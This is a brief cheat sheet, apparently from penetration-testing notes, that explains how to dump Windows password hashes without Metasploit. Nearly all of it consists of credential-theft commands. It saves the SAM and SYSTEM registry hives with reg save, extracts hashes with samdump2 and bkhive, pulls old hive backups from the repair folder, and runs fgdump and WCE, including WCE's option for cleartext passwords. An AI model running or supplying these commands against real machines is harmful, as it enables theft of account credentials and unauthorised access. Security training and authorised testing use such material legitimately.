# Windows HashDump without metasploit

##  Windows Passwords

### Reg Commands to get passwords' file

System file 

`reg save HKLM\System system.hive`

SAM File 

`reg save HKLM\SAM sam.hive`


### HASHDUMP

`samdump2 system.hive sam.hive`


#### Windows Repair

Backup files < Windows 2003

`c:\windows\repair`

Donwload sam and system.

`bkhive system key.txt`
`samdump2 sam key.txt`


### FGDump

Kali Path:  /usr/share/windows-binaries/fgdump/fgdump.exe


### WCE

Kali Paths:
* /usr/share/wce/wce32.exe
* /usr/share/wce/wce64.exe
* /usr/share/wce/wce-universal.exe

Get pass

`wce-universal.exe `

Try to get pass into clear text

`wce-universal.exe -w`






